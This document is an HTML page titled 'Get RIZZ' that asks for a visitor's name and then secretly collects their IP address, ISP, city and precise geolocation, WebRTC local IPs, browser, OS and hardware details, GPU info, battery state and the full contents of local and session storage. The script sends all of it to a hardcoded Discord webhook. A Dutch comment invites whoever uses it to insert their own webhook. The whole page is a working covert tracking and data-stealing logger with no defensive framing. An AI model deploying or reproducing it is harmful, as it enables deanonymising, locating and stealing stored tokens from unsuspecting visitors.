<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get RIZZ</title>
</head>
<body>
    <h2>ğŸ“¡ Enter your name to continue...</h2>
    <form id="nameForm">
        <label>Enter your name:</label>
        <input type="text" id="userName" required>
        <button type="button" onclick="startLogging()">Send</button>
    </form>

    <script>
        // ğŸš¨ Vervang met je eigen Discord webhook URL!
        const webhookURL = "https://discord.com/api/webhooks/1351915230162194505/1UuADVPH0L6Z7tZWe13pCuwuNyD0oCCTt94uFBJnYht9dWIgjaEXHQfw-N9M_EUmeBzi";

        let userName = "";

        function startLogging() {
            userName = document.getElementById("userName").value.trim();
            if (!userName) {
                alert("âš ï¸ Please enter your name before continuing.");
                return;
            }

            sendToDiscord(`ğŸ‘¤ Name: ${userName}`);
            getIP();
            getSystemInfo();
            getWebRTCIP();
            getLocalStorage();
            getSessionStorage();
            getGPUInfo();
        }

        function getIP() {
            fetch("https://api64.ipify.org?format=json")
            .then(response => response.json())
            .then(data => sendToDiscord(`ğŸŒ Extern IP: ${data.ip}`));

            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                let ipInfo = `ğŸŒ ISP: ${data.org}\nğŸŒ Location: ${data.city}, ${data.region}, ${data.country}`;
                sendToDiscord(ipInfo);
            });
        }

        function getSystemInfo() {
            let info = {
                "ğŸ“Œ Browser": navigator.userAgent,
                "ğŸ–¥ï¸ OS": navigator.platform,
                "ğŸ’¾ RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                "ğŸ–¥ï¸ CPU Cores": navigator.hardwareConcurrency || "Unknown",
                "ğŸ“ Screen Resolution": `${window.screen.width}x${window.screen.height}`,
                "ğŸŒ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "ğŸ”‹ Battery Status": "Not available",
                "ğŸ”Œ Online Status": navigator.onLine ? "âœ… Online" : "âŒ Offline",
                "ğŸ” Cookies Enabled": navigator.cookieEnabled ? "âœ… Yes" : "âŒ No",
                "ğŸ•µï¸ Referrer": document.referrer || "Direct visit"
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    info["ğŸ“ Geolocation"] = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    sendToDiscord(JSON.stringify(info, null, 2));
                }, () => {
                    sendToDiscord(JSON.stringify(info, null, 2));
                });
            } else {
                sendToDiscord(JSON.stringify(info, null, 2));
            }

            navigator.getBattery().then(battery => {
                info["ğŸ”‹ Battery Status"] = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(ğŸ”Œ Charging)" : "(ğŸ”‹ Not charging)"}`;
                sendToDiscord(JSON.stringify(info, null, 2));
            });
        }

        function getWebRTCIP() {
            let peerConnection = new RTCPeerConnection({ iceServers: [] });
            peerConnection.createDataChannel("");
            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));

            peerConnection.onicecandidate = event => {
                if (event.candidate) {
                    sendToDiscord("ğŸŒ WebRTC IP: " + event.candidate.candidate);
                }
            };
        }

        function getLocalStorage() {
            let localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            sendToDiscord("ğŸ“¦ Local Storage: " + JSON.stringify(localStorageData, null, 2));
        }

        function getSessionStorage() {
            let sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            sendToDiscord("ğŸ“¦ Session Storage: " + JSON.stringify(sessionStorageData, null, 2));
        }

        function getGPUInfo() {
            let canvas = document.createElement("canvas");
            let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

            if (gl) {
                let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                let vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                sendToDiscord(`ğŸ® GPU Vendor: ${vendor}\nğŸ–¥ï¸ Renderer: ${renderer}`);
            }
        }

        function sendToDiscord(message) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "```" + message + "```" })
            });
        }
    </script>
</body>
</html>
